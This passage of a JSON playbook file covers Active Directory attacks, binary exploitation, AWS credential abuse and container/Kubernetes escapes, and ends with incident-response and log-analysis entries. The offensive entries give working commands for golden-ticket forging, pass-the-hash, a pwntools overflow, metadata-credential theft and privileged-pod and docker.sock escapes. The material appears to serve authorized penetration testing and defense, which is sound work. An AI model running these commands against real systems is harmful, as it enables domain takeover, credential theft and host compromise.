      "cmd": "crackmapexec smb <DC-IP> -u Administrator -H <HASH> -d <DOMAIN>"
     },
     {
      "do": "Forge a golden ticket with the krbtgt hash and domain SID",
      "cmd": "impacket-ticketer -nthash <HASH> -domain-sid S-1-5-21-XXXX -domain <DOMAIN> pwn",
      "note": "Get the SID from secretsdump output; ticket is written as pwn.ccache."
     },
     {
      "do": "Use the forged ticket to run commands on the DC",
      "cmd": "KRB5CCNAME=pwn.ccache impacket-psexec -k -no-pass <DOMAIN>/pwn@dc.<DOMAIN>.local"
     }
    ]
   }
  ],
  "verify": "crackmapexec against the DC with the dumped Administrator hash returns Pwn3d! confirming domain-admin-level access.",
  "cleanup": "Remove any added group memberships, restore reset passwords, delete forged .ccache files, and revoke the DCSync ACE you added with dacledit -action remove.",
  "safety": "Only execute against domains explicitly listed in the signed engagement scope; golden-ticket and krbtgt operations are persistent and must be documented and reverted."
 },
 {
  "id": "binary-exploitation-reverse-engineering",
  "title": "Binary Exploitation & Reverse Engineering",
  "cat": "Reverse Engineering",
  "goal": "Triage an unknown ELF, locate a memory-corruption bug, and develop a working exploit from offset to shell.",
  "when": "During a CTF pwn challenge or an authorized binary audit where you hold the target executable.",
  "risk": "low",
  "tools": [
   "gdb",
   "pwndbg",
   "pwntools",
   "radare2",
   "ghidra",
   "checksec",
   "ropper",
   "ltrace"
  ],
  "mitre": [
   "T1203 Exploitation for Client Execution",
   "T1055 Process Injection",
   "T1588.005 Obtain Capabilities: Exploits",
   "T1587.004 Develop Capabilities: Exploits"
  ],
  "phases": [
   {
    "name": "Triage",
    "steps": [
     {
      "do": "Identify file type, architecture, and linkage",
      "cmd": "file ./target"
     },
     {
      "do": "Pull readable strings for hints and format specifiers",
      "cmd": "strings -n 6 ./target | less"
     },
     {
      "do": "Check binary mitigations (RELRO, canary, NX, PIE)",
      "cmd": "checksec --file=./target"
     },
     {
      "do": "List imported libc functions that often signal bugs",
      "cmd": "objdump -d -j .plt ./target | grep -E 'gets|strcpy|system|printf'"
     }
    ]
   },
   {
    "name": "Static analysis",
    "steps": [
     {
      "do": "Load into radare2 and auto-analyze functions",
      "cmd": "r2 -A ./target"
     },
     {
      "do": "Disassemble main to read the control flow",
      "cmd": "echo 'pdf @ main' | r2 -q -A ./target"
     },
     {
      "do": "Open in Ghidra headless for decompilation",
      "cmd": "analyzeHeadless /tmp/proj proj -import ./target -postScript DecompileAll.java"
     },
     {
      "do": "Resolve dangerous call sites and buffer sizes from the decompiler output",
      "cmd": "grep -nE 'gets|read|memcpy|sprintf' decompiled.c"
     }
    ]
   },
   {
    "name": "Dynamic analysis",
    "steps": [
     {
      "do": "Launch under gdb with pwndbg loaded",
      "cmd": "gdb -q ./target"
     },
     {
      "do": "Trace library calls to watch argument flow",
      "cmd": "ltrace ./target"
     },
     {
      "do": "Trace syscalls for I/O and memory behavior",
      "cmd": "strace -f ./target"
     },
     {
      "do": "Set a breakpoint on the vulnerable function and inspect the stack",
      "cmd": "echo 'break vuln\\nrun\\nstack 40' | gdb -q ./target"
     }
    ]
   },
   {
    "name": "Exploit development",
    "steps": [
     {
      "do": "Generate a cyclic pattern to find the return offset",
      "cmd": "cyclic 200 | ./target"
     },
     {
      "do": "Compute the exact offset from the crashing value in pwndbg",
      "cmd": "python3 -c 'from pwn import cyclic_find; print(cyclic_find(0x6161616c))'"
     },
     {
      "do": "Enumerate ROP gadgets for a ret2system or mprotect chain",
      "cmd": "ropper --file ./target --search 'pop rdi; ret'"
     },
     {
      "do": "Build and fire the exploit with pwntools",
      "cmd": "python3 -c 'from pwn import *; p=process(\"./target\"); p.sendline(b\"A\"*72+p64(0x401234)); p.interactive()'",
      "note": "For format-string bugs, leak with '%p.'*20 then target a GOT entry via fmtstr_payload()."
     }
    ]
   }
  ],
  "verify": "Running the pwntools exploit against the target drops to an interactive shell where id returns the challenge user.",
  "cleanup": "Nothing to clean on the target host; delete local project dirs, core dumps, and generated cyclic/offset scratch files.",
  "safety": "Only analyze and exploit binaries you are authorized to test; keep all work in an isolated VM or CTF container, never against production services."
 },
 {
  "id": "cloud-enumeration-aws-focus",
  "title": "Cloud Enumeration & Attacks (AWS focus)",
  "cat": "Cloud",
  "goal": "Validate discovered cloud credentials, map effective IAM permissions, and enumerate privilege-escalation and data-access paths in AWS.",
  "when": "After recovering AWS access keys or an instance role during an authorized cloud assessment.",
  "risk": "high",
  "tools": [
   "awscli",
   "pacu",
   "s3scanner",
   "enumerate-iam"
  ],
  "mitre": [
   "T1078.004 Valid Accounts: Cloud Accounts",
   "T1526 Cloud Service Discovery",
   "T1552.005 Unsecured Credentials: Cloud Instance Metadata API",
   "T1619 Cloud Storage Object Discovery",
   "T1098.001 Account Manipulation: Additional Cloud Credentials"
  ],
  "phases": [
   {
    "name": "Credential validation",
    "steps": [
     {
      "do": "Confirm the key works and identify the principal",
      "cmd": "aws sts get-caller-identity"
     },
     {
      "do": "Store keys under a named profile for clean tooling",
      "cmd": "aws configure --profile target"
     },
     {
      "do": "Check which region and account the key belongs to",
      "cmd": "aws sts get-caller-identity --profile target --output json"
     }
    ]
   },
   {
    "name": "Permission enumeration",
    "steps": [
     {
      "do": "Brute-force effective permissions non-destructively",
      "cmd": "enumerate-iam --access-key <USER> --secret-key <PASS>"
     },
     {
      "do": "List attached policies for the current user",
      "cmd": "aws iam list-attached-user-policies --user-name <USER> --profile target"
     },
     {
      "do": "Enumerate roles the principal might assume",
      "cmd": "aws iam list-roles --profile target --query 'Roles[].Arn'"
     },
     {
      "do": "Dump inline policy documents for privesc review",
      "cmd": "aws iam list-user-policies --user-name <USER> --profile target"
     }
    ]
   },
   {
    "name": "Data and secrets discovery",
    "steps": [
     {
      "do": "List account-owned S3 buckets",
      "cmd": "aws s3 ls --profile target"
     },
     {
      "do": "Scan for public/accessible buckets by name",
      "cmd": "s3scanner scan --bucket <FILE>"
     },
     {
      "do": "Enumerate and read SSM parameters",
      "cmd": "aws ssm describe-parameters --profile target && aws ssm get-parameters-by-path --path / --recursive --with-decryption --profile target"
     },
     {
      "do": "List and retrieve Secrets Manager secrets",
      "cmd": "aws secretsmanager list-secrets --profile target --query 'SecretList[].Name'"
     }
    ]
   },
   {
    "name": "Metadata and privilege escalation",
    "steps": [
     {
      "do": "From a compromised EC2 host, grab IMDSv1 role creds",
      "cmd": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "note": "For IMDSv2 first PUT a token to /latest/api/token and send it as X-aws-ec2-metadata-token."
     },
     {
      "do": "Run Pacu to map automated privesc paths",
      "cmd": "pacu"
     },
     {
      "do": "Inside Pacu, enumerate IAM then test escalation modules",
      "cmd": "run iam__enum_permissions && run iam__privesc_scan"
     },
     {
      "do": "Note cross-cloud equivalents for the report",
      "cmd": "az ad signed-in-user show ; gcloud auth list",
      "note": "Azure: az account show / az role assignment list. GCP: gcloud projects get-iam-policy <PROJECT>."
     }
    ]
   }
  ],
  "verify": "iam__privesc_scan in Pacu or enumerate-iam output confirms at least one actionable permission (e.g. iam:CreateAccessKey or sts:AssumeRole) on a higher-privileged principal.",
  "cleanup": "Delete any access keys, IAM users, or policy versions created during privesc testing, and remove the local awscli 'target' profile from ~/.aws.",
  "safety": "Operate only within the account IDs named in the authorization letter; avoid data exfiltration and do not modify production IAM outside the agreed change window."
 },
 {
  "id": "container-kubernetes-attacks",
  "title": "Container & Kubernetes Attacks",
  "cat": "Containers",
  "goal": "Determine whether a container can be escaped to the host or a Kubernetes service account can be abused toward cluster compromise.",
  "when": "After gaining code execution inside a container or pod during an authorized container/orchestration assessment.",
  "risk": "high",
  "tools": [
   "kubectl",
   "docker",
   "kube-hunter",
   "amicontained"
  ],
  "mitre": [
   "T1610 Deploy Container",
   "T1611 Escape to Host",
   "T1613 Container and Resource Discovery",
   "T1552.001 Unsecured Credentials: Credentials In Files",
   "T1078.001 Valid Accounts: Default Accounts"
  ],
  "phases": [
   {
    "name": "Container enumeration",
    "steps": [
     {
      "do": "Confirm you are inside a container",
      "cmd": "cat /proc/1/cgroup | grep -E 'docker|kubepods'"
     },
     {
      "do": "Inspect granted capabilities and seccomp posture",
      "cmd": "amicontained"
     },
     {
      "do": "Check for a mounted Docker socket",
      "cmd": "ls -la /var/run/docker.sock"
     },
     {
      "do": "Look for sensitive host mounts and writable paths",
      "cmd": "mount | grep -E 'host|/proc|/sys' ; cat /proc/self/status | grep CapEff"
     }
    ]
   },
   {
    "name": "Docker breakout",
    "steps": [
     {
      "do": "If privileged, mount the host disk and chroot in",
      "cmd": "mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh",
      "note": "Identify the host device from fdisk -l or lsblk first."
     },
     {
      "do": "Abuse an exposed docker.sock to launch a host-mounting container",
      "cmd": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh"
     },
     {
      "do": "With CAP_SYS_ADMIN, escape via the cgroup release_agent trick",
      "cmd": "echo 1 > /tmp/c/notify_on_release && echo '#!/bin/sh' > /cmd && chmod +x /cmd",
      "note": "Classic release_agent escape; wire /cmd to the host cgroup release_agent path."
     }
    ]
   },
   {
    "name": "Kubernetes recon",
    "steps": [
     {
      "do": "Read the mounted service-account token and CA",
      "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
     },
     {
      "do": "Enumerate what the service account can do",
      "cmd": "kubectl auth can-i --list"
     },
     {
      "do": "List secrets if RBAC allows",
      "cmd": "kubectl get secrets -A -o json"
     },
     {
      "do": "Scan the cluster for known misconfigurations",
      "cmd": "kube-hunter --remote <IP>"
     }
    ]
   },
   {
    "name": "Pod escape and lateral movement",
    "steps": [
     {
      "do": "If allowed, create a privileged pod that mounts the node root",
      "cmd": "kubectl run esc --image=alpine --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"x\",\"image\":\"alpine\",\"securityContext\":{\"privileged\":true},\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"sh\"],\"stdin\":true,\"tty\":true}]}}' -it"
     },
     {
      "do": "Harvest tokens from all reachable pods",
      "cmd": "kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{\"\\n\"}{end}'"
     },
     {
      "do": "Query the kube-apiserver directly with the token",
      "cmd": "curl -k -H 'Authorization: Bearer <HASH>' https://<IP>:6443/api/v1/namespaces/default/secrets"
     },
     {
      "do": "Pivot to cloud metadata from the node for IAM creds",
      "cmd": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
     }
    ]
   }
  ],
  "verify": "A chroot/nsenter into the host returns the node's real hostname and root filesystem, or kubectl auth can-i confirms secrets/exec rights across namespaces.",
  "cleanup": "Delete any pods you created (kubectl delete pod esc), unmount host disks, and remove copied tokens or breakout scripts from the container.",
  "safety": "Escapes and privileged pods affect the underlying node and other tenants; run only against clusters in scope and coordinate with the operator before deploying workloads."
 },
 {
  "id": "incident-response-host-triage",
  "title": "Incident Response & Host Triage (Blue Team)",
  "cat": "Blue Team",
  "goal": "Rapidly collect volatile evidence from a suspected-compromised host and analyze memory to confirm and scope an intrusion.",
  "when": "When responding to an alert or report of compromise on a Linux or Windows endpoint under your authority.",
  "risk": "medium",
  "tools": [
   "volatility3",
   "ss",
   "lsof",
   "autorunsc",
   "Get-WinEvent",
   "avml"
  ],
  "mitre": [
   "T1057 Process Discovery",
   "T1049 System Network Connections Discovery",
   "T1547 Boot or Logon Autostart Execution",
   "T1070.004 Indicator Removal: File Deletion",
   "T1055 Process Injection"
  ],
  "phases": [
   {
    "name": "Linux live triage",
    "steps": [
     {
      "do": "Capture the full process tree with command lines",
      "cmd": "ps auxwwf"
     },
     {
      "do": "List listening sockets and owning processes",
      "cmd": "ss -tulpane"
     },
     {
      "do": "Find deleted-but-open binaries (fileless/staged malware)",
      "cmd": "lsof +L1"
     },
     {
      "do": "Inspect persistence in cron and services",
      "cmd": "cat /etc/crontab /etc/cron.d/* ; crontab -l"
     },
     {
      "do": "Review recent authentication for anomalous logins",
      "cmd": "grep -E 'Accepted|Failed|sudo' /var/log/auth.log | tail -n 100"
     }
    ]
   },
   {
    "name": "Windows live triage",
    "steps": [
     {
      "do": "List running processes",
      "cmd": "tasklist /v"
     },
     {
      "do": "Show active network connections with owning PIDs",
      "cmd": "netstat -anob"
     },
     {
      "do": "Dump all autostart entries to CSV",
      "cmd": "autorunsc.exe -accepteula -a * -c -o autoruns.csv"
     },
     {
      "do": "Pull recent process-creation events (needs 4688 auditing)",
      "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 200"
     }
    ]
   },
   {
    "name": "Volatile collection",
    "steps": [
     {
      "do": "Capture Linux physical memory with AVML",
      "cmd": "avml /evidence/mem.lime"
     },
     {
      "do": "Capture Windows memory with WinPMEM",
      "cmd": "winpmem.exe -o E:\\evidence\\mem.raw"
     },
     {
      "do": "Hash the memory image before analysis",
      "cmd": "sha256sum /evidence/mem.lime > /evidence/mem.lime.sha256"
     }
    ]
   },
   {
    "name": "Memory analysis",
    "steps": [
     {
      "do": "List processes from the image",
      "cmd": "vol -f /evidence/mem.lime linux.pslist"
     },
     {
      "do": "Recover network connections",
      "cmd": "vol -f /evidence/mem.raw windows.netscan"
     },
     {
      "do": "Hunt for injected or hollowed code",
      "cmd": "vol -f /evidence/mem.raw windows.malfind"
     },
     {
      "do": "Build a supertimeline across disk and logs",
      "cmd": "log2timeline.py --storage-file timeline.plaso /evidence/image.E01 && psort.py -o l2tcsv -w timeline.csv timeline.plaso"
     }
    ]
   }
  ],
  "verify": "Volatility netscan/malfind and the plaso timeline corroborate the same suspicious process, connection, and persistence artifact seen in live triage.",
  "cleanup": "Nothing to clean on evidence; store images and output on write-once/read-only media, record SHA-256 hashes, and maintain chain-of-custody documentation.",
  "safety": "Preserve evidence order of volatility and avoid writing to the subject disk; act only on hosts within your organization's authorized IR remit."
 },
 {
  "id": "log-analysis-threat-detection",
  "title": "Log Analysis & Threat Detection (Blue Team)",
  "cat": "Blue Team",
  "goal": "Parse host, web, and network logs to detect brute force, web exploitation, and suspicious authentication, then operationalize detections.",
  "when": "During proactive threat hunting or triage of an alert across collected log sources.",
  "risk": "low",
  "tools": [
   "grep",
   "awk",
   "jq",
   "sigma-cli",
   "zeek",
   "yara",
   "Get-WinEvent"
  ],
  "mitre": [
   "T1110 Brute Force",
   "T1190 Exploit Public-Facing Application",
   "T1078 Valid Accounts",
   "T1021.002 Remote Services: SMB/Windows Admin Shares",
   "T1059 Command and Scripting Interpreter"
  ],
  "phases": [
   {
    "name": "Authentication and web log parsing",
    "steps": [
     {
      "do": "Rank source IPs by failed SSH logins to spot brute force",
      "cmd": "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head"
     },
     {
      "do": "Find web requests returning server errors or injection markers",
      "cmd": "awk '$9>=500 || $7 ~ /union|select|\\.\\.\\//' /var/log/nginx/access.log"
     },
     {
      "do": "Query JSON firewall logs for denied egress",
      "cmd": "jq 'select(.action==\"deny\") | {src:.src_ip,dst:.dst_ip,port:.dst_port}' firewall.json"
     },
     {
      "do": "Correlate a brute-force IP to any successful login",
      "cmd": "grep '<IP>' /var/log/auth.log | grep 'Accepted'"
     }
    ]
   },
   {
    "name": "Windows event analysis",
    "steps": [
     {
      "do": "Pull failed logons and bucket by account",
      "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} | Group-Object {$_.Properties[5].Value}"
     },
     {
      "do": "Review successful logons with logon type for anomalies",
      "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} | Where-Object {$_.Properties[8].Value -eq 10}"
     },
     {
      "do": "Hunt Kerberos TGT/TGS requests (4768/4769) for roasting",
      "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} | Where-Object {$_.Message -match 'RC4'}"
     },
     {
      "do": "Inspect process creation with command lines (4688/Sysmon 1)",
      "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} -MaxEvents 200"
     }
    ]
   },
   {
    "name": "Detection engineering",
    "steps": [
     {
      "do": "Convert a Sigma rule to your SIEM query language",
      "cmd": "sigma convert -t splunk -p sysmon rules/win_susp_powershell.yml"
     },
     {
      "do": "Validate a rule against a sample event set",
      "cmd": "sigma check rules/win_susp_powershell.yml"
     },
     {
      "do": "List available backends/pipelines for conversion",
      "cmd": "sigma list targets"
     }
    ]
   },
   {
    "name": "Network and file hunting",
    "steps": [
     {
      "do": "Process a pcap with Zeek to generate connection logs",
      "cmd": "zeek -r capture.pcap"
     },
     {
      "do": "Surface long-lived or beacon-like connections from conn.log",
      "cmd": "cat conn.log | zeek-cut id.orig_h id.resp_h duration | sort -k3 -rn | head"
     },
     {
      "do": "Scan suspicious files or memory with a YARA ruleset",
      "cmd": "yara -r -s rules/malware.yar /evidence/"
     },
     {
      "do": "Extract files carved by Zeek for YARA triage",
      "cmd": "yara -r rules/malware.yar ./extract_files/"
     }
    ]
   }
  ],
  "verify": "A detected indicator (brute-force source, injection request, or RC4 TGS) is confirmed across at least two independent log sources and matches a Sigma or YARA rule hit.",
  "cleanup": "Nothing to clean on monitored systems; remove any copied log extracts and pcaps from the analysis workstation when the investigation closes.",
  "safety": "Analyze only logs from systems your organization is authorized to monitor, and handle any captured credentials or PII under your data-handling policy."
 }
];
